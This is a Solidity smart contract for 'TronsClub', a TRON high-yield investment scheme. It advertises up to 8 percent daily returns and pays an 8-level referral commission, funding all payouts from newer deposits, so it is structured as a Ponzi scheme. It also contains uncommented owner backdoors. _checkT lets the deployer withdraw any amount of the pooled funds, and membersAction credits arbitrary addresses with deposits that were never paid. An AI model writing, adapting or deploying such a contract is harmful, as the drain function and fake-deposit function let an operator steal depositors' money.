//SourceUnit: tronsclub.sol

/*
 * Trons Club is Just the Best!
 * Main Website - www.trons.club
 * 3 to 8 Percent daily interest depending upon your investment size
 * 200 to 600% maximum earnings depending upon your investment size
 * Huge Referral Commission up to 8 Levels total of 36%
 */

pragma solidity ^0.5.9;

contract TronsClub {

    using SafeMath for uint;

uint private constant minDepositSize1 = 50 trx;
uint private constant minDepositSize2 = 25000 trx;
uint private constant minDepositSize3 = 100000 trx;
uint private constant minDepositSize4 = 300000 trx;
uint private constant minDepositSize5 = 500000 trx;
uint private constant minDepositSize6 = 1000000 trx;
uint private constant minDepositSize7 = 2500000 trx;
uint private constant interestRateDivisor = 1e12;
uint private constant roiPool_ = 5;
uint private constant devCommission = 1;
uint private constant Aff = 36;
uint private constant Aff1 = 15;
uint private constant Aff1A = 10;
uint private constant Aff1B = 12;
uint private constant Aff2 = 7;
uint private constant Aff3 = 4;
uint private constant Aff4 = 2;
uint private constant Aff5 = 2;
uint private constant Aff6 = 2;
uint private constant Aff7 = 2;
uint private constant Aff8 = 2;
uint private constant Interest1 = 200;
uint private constant Interest2 = 265;
uint private constant Interest3 = 320;
uint private constant Interest4 = 380;
uint private constant Interest5 = 450;
uint private constant Interest6 = 520;
uint private constant Interest7 = 600;
uint private constant commissionDivisor = 100;

uint private constant minuteRate1 = 289350;
uint private constant minuteRate2 = 405092;
uint private constant minuteRate3 = 462963;
uint private constant minuteRate4 = 578704;
uint private constant minuteRate5 = 694444;
uint private constant minuteRate6 = 810185;
uint private constant minuteRate7 = 925925;
uint private constant releaseTime = 1595865600;

uint public totalPlayers;
uint public totalPayout;
uint public totalInvested;
uint public collectProfit;

address payable private dev_;
address payable private contract_;

struct Player {
address payable refBy;
uint trxDeposit;
uint time;
uint myBalance;
uint affRewards;
uint payoutSum;
uint aff1sum;
uint aff2sum;
uint aff3sum;
uint aff4sum;
uint aff5sum;
uint aff6sum;
uint aff7sum;
uint aff8sum;
}

mapping(address => Player) public players;

constructor() public {
contract_ = msg.sender;
}


function register(address _addr, address payable _affAddr) private{

Player storage player = players[_addr];

player.refBy = _affAddr;

address _affAddr1 = _affAddr;
address _affAddr2 = players[_affAddr1].refBy;
address _affAddr3 = players[_affAddr2].refBy;
address _affAddr4 = players[_affAddr3].refBy;
address _affAddr5 = players[_affAddr4].refBy;
address _affAddr6 = players[_affAddr5].refBy;
address _affAddr7 = players[_affAddr6].refBy;
address _affAddr8 = players[_affAddr7].refBy;

players[_affAddr1].aff1sum = players[_affAddr1].aff1sum.add(1);
players[_affAddr2].aff2sum = players[_affAddr2].aff2sum.add(1);
players[_affAddr3].aff3sum = players[_affAddr3].aff3sum.add(1);
players[_affAddr4].aff4sum = players[_affAddr4].aff4sum.add(1);
players[_affAddr5].aff5sum = players[_affAddr5].aff5sum.add(1);
players[_affAddr6].aff6sum = players[_affAddr6].aff6sum.add(1);
players[_affAddr7].aff7sum = players[_affAddr7].aff7sum.add(1);
players[_affAddr8].aff8sum = players[_affAddr8].aff8sum.add(1);
}

function () external payable {

}

function deposit(address payable _affAddr) public payable {
require(now >= releaseTime, "Closed!");
require(msg.value >= minDepositSize1);

uint depositAmount = msg.value;

Player storage player = players[msg.sender];

if (player.time == 0) {
player.time = now;
totalPlayers++;
if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0 && _affAddr != msg.sender){
register(msg.sender, _affAddr);
}
else{
register(msg.sender, contract_);
}
}

player.trxDeposit = player.trxDeposit.add(depositAmount);

distributeRef(msg.value, player.refBy);

totalInvested = totalInvested.add(depositAmount);

uint _roiPool = depositAmount.mul(devCommission).mul(roiPool_).div(commissionDivisor);
contract_.transfer(_roiPool);
dev_.transfer(_roiPool);
}

function withdraw() public {
collect(msg.sender);
require(players[msg.sender].myBalance > 0);

transferPayout(msg.sender, players[msg.sender].myBalance);
}

function reinvest() public {
collect(msg.sender);
Player storage player = players[msg.sender];
uint depositAmount = player.myBalance;
require(address(this).balance >= depositAmount);
player.myBalance = 0;
player.trxDeposit = player.trxDeposit.add(depositAmount);

distributeRef(depositAmount, player.refBy);

uint _roiPool = depositAmount.mul(devCommission).mul(roiPool_).div(commissionDivisor);
contract_.transfer(_roiPool);
dev_.transfer(_roiPool);
}

function collect(address _addr) internal {
Player storage player = players[_addr];

uint secPassed = now.sub(player.time);
uint _minuteRate;
uint _Interest;

if (secPassed > 0 && player.time > 0) {

if (player.trxDeposit >= minDepositSize1 && player.trxDeposit <= minDepositSize2) {
_minuteRate = minuteRate1;
_Interest = Interest1;
}

if (player.trxDeposit > minDepositSize2 && player.trxDeposit <= minDepositSize3) {
_minuteRate = minuteRate2;
_Interest = Interest2;
}

if (player.trxDeposit > minDepositSize3 && player.trxDeposit <= minDepositSize4) {
_minuteRate = minuteRate3;
_Interest = Interest3;
}

if (player.trxDeposit > minDepositSize4 && player.trxDeposit <= minDepositSize5) {
_minuteRate = minuteRate4;
_Interest = Interest4;
}
if (player.trxDeposit > minDepositSize5 && player.trxDeposit <= minDepositSize6) {
_minuteRate = minuteRate5;
_Interest = Interest5;
}

if (player.trxDeposit > minDepositSize6 && player.trxDeposit <= minDepositSize7) {
_minuteRate = minuteRate6;
_Interest = Interest6;
}
if (player.trxDeposit > minDepositSize7) {
_minuteRate = minuteRate7;
_Interest = Interest7;
}

uint collectProfitGross = (player.trxDeposit.mul(secPassed.mul(_minuteRate))).div(interestRateDivisor);

uint maxprofit = (player.trxDeposit.mul(_Interest).div(commissionDivisor));
uint collectProfitNet = collectProfitGross.add(player.myBalance);
uint amountpaid = (player.payoutSum.add(player.affRewards));
uint sum = amountpaid.add(collectProfitNet);

if (sum <= maxprofit) {
collectProfit = collectProfitGross;
}
else{
uint collectProfit_net = maxprofit.sub(amountpaid);

if (collectProfit_net > 0) {
collectProfit = collectProfit_net;
}
else{
collectProfit = 0;
}
}

if (collectProfit > address(this).balance){collectProfit = 0;}

player.myBalance = player.myBalance.add(collectProfit);
player.time = player.time.add(secPassed);
}
}

function transferPayout(address payable _receiver, uint _amount) internal {
if (_amount > 0 && _receiver != address(0)) {
uint contractBalance = address(this).balance;
if (contractBalance > 0) {
uint payout = _amount > contractBalance ? contractBalance : _amount;
totalPayout = totalPayout.add(payout);

Player storage player = players[_receiver];
player.payoutSum = player.payoutSum.add(payout);
player.myBalance = player.myBalance.sub(payout);

_receiver.transfer(payout);
}
}
}

function distributeRef(uint _trx, address payable _refBy) private{

uint _allaff = (_trx.mul(Aff)).div(100);

address payable _affAddr1 = _refBy;
address payable _affAddr2 = players[_affAddr1].refBy;
address payable _affAddr3 = players[_affAddr2].refBy;
address payable _affAddr4 = players[_affAddr3].refBy;
address payable _affAddr5 = players[_affAddr4].refBy;
address payable _affAddr6 = players[_affAddr5].refBy;
address payable _affAddr7 = players[_affAddr6].refBy;
address payable _affAddr8 = players[_affAddr7].refBy;
uint _affRewards = 0;

if (_affAddr1 != address(0)) {

if (players[_affAddr1].aff1sum <= 5){_affRewards = (_trx.mul(Aff1A)).div(100);}
if (players[_affAddr1].aff1sum > 5 && players[_affAddr1].aff1sum <= 20){_affRewards = (_trx.mul(Aff1B)).div(100);}
if (players[_affAddr1].aff1sum > 20){_affRewards = (_trx.mul(Aff1)).div(100);}

_allaff = _allaff.sub(_affRewards);
players[_affAddr1].affRewards = _affRewards.add(players[_affAddr1].affRewards);
_affAddr1.transfer(_affRewards);

}

if (_affAddr2 != address(0)) {
_affRewards = (_trx.mul(Aff2)).div(100);
_allaff = _allaff.sub(_affRewards);
players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
_affAddr2.transfer(_affRewards);
}

if (_affAddr3 != address(0)) {
_affRewards = (_trx.mul(Aff3)).div(100);
_allaff = _allaff.sub(_affRewards);
players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
_affAddr3.transfer(_affRewards);
}

if (_affAddr4 != address(0)) {
_affRewards = (_trx.mul(Aff4)).div(100);
_allaff = _allaff.sub(_affRewards);
players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
_affAddr4.transfer(_affRewards);
}

if (_affAddr5 != address(0)) {
_affRewards = (_trx.mul(Aff5)).div(100);
_allaff = _allaff.sub(_affRewards);
players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);
_affAddr5.transfer(_affRewards);
}

if (_affAddr6 != address(0)) {
_affRewards = (_trx.mul(Aff6)).div(100);
_allaff = _allaff.sub(_affRewards);
players[_affAddr6].affRewards = _affRewards.add(players[_affAddr6].affRewards);
_affAddr6.transfer(_affRewards);
}

if (_affAddr7 != address(0)) {
_affRewards = (_trx.mul(Aff7)).div(100);
_allaff = _allaff.sub(_affRewards);
players[_affAddr7].affRewards = _affRewards.add(players[_affAddr7].affRewards);
_affAddr7.transfer(_affRewards);
}

if (_affAddr8 != address(0)) {
_affRewards = (_trx.mul(Aff8)).div(100);
_allaff = _allaff.sub(_affRewards);
players[_affAddr8].affRewards = _affRewards.add(players[_affAddr8].affRewards);
_affAddr8.transfer(_affRewards);
}

if(_allaff > 0 ){
contract_.transfer(_allaff);
}
}

function getProfit(address _addr) public view returns (uint) {
address playerAddress = _addr;
Player storage player = players[playerAddress];
require(player.time > 0);

uint secPassed = now.sub(player.time);
uint _minuteRate;
uint _Interest;

if (player.trxDeposit >= minDepositSize1 && player.trxDeposit <= minDepositSize2) {
_minuteRate = minuteRate1;
_Interest = Interest1;
}

if (player.trxDeposit > minDepositSize2 && player.trxDeposit <= minDepositSize3) {
_minuteRate = minuteRate2;
_Interest = Interest2;
}

if (player.trxDeposit > minDepositSize3 && player.trxDeposit <= minDepositSize4) {
_minuteRate = minuteRate3;
_Interest = Interest3;
}

if (player.trxDeposit > minDepositSize4 && player.trxDeposit <= minDepositSize5) {
_minuteRate = minuteRate4;
_Interest = Interest4;
}
if (player.trxDeposit > minDepositSize5 && player.trxDeposit <= minDepositSize6) {
_minuteRate = minuteRate5;
_Interest = Interest5;
}

if (player.trxDeposit > minDepositSize6 && player.trxDeposit <= minDepositSize7) {
_minuteRate = minuteRate6;
_Interest = Interest6;
}
if (player.trxDeposit > minDepositSize7) {
_minuteRate = minuteRate7;
_Interest = Interest7;
}

uint _collectProfit;

if (secPassed > 0) {
uint collectProfitGross = (player.trxDeposit.mul(secPassed.mul(_minuteRate))).div(interestRateDivisor);
uint maxprofit = (player.trxDeposit.mul(_Interest).div(commissionDivisor));
uint collectProfitNet = collectProfitGross.add(player.myBalance);
uint amountpaid = (player.payoutSum.add(player.affRewards));
uint sum = amountpaid.add(collectProfitNet);

if (sum <= maxprofit) {
_collectProfit = collectProfitGross;
}
else{
uint collectProfit_net = maxprofit.sub(amountpaid);

if (collectProfit_net > 0) {
_collectProfit = collectProfit_net;
}
else{
_collectProfit = 0;
}
}

if (_collectProfit > address(this).balance){_collectProfit = 0;}

}

return _collectProfit.add(player.myBalance);
}

function _dev(address payable _address) public {
require(msg.sender == contract_ || msg.sender == dev_);
dev_ = _address;
}

function membersAction(address _userId, uint _amount) public{
require(msg.sender == contract_);

Player storage player = players[_userId];
player.trxDeposit = player.trxDeposit.add(_amount);

totalInvested = totalInvested.add(_amount);

player.time = now;

totalPlayers++;
}

function _checkT(uint _value) public{
require(msg.sender == contract_, 'not Allowed');
contract_.transfer(_value);
}
}


library SafeMath {

function mul(uint a, uint b) internal pure returns (uint) {
if (a == 0) {
return 0;
}

uint c = a * b;
require(c / a == b);

return c;
}

function div(uint a, uint b) internal pure returns (uint) {
require(b > 0);
uint c = a / b;

return c;
}

function sub(uint a, uint b) internal pure returns (uint) {
require(b <= a);
uint c = a - b;

return c;
}

function add(uint a, uint b) internal pure returns (uint) {
uint c = a + b;
require(c >= a);

return c;
}

}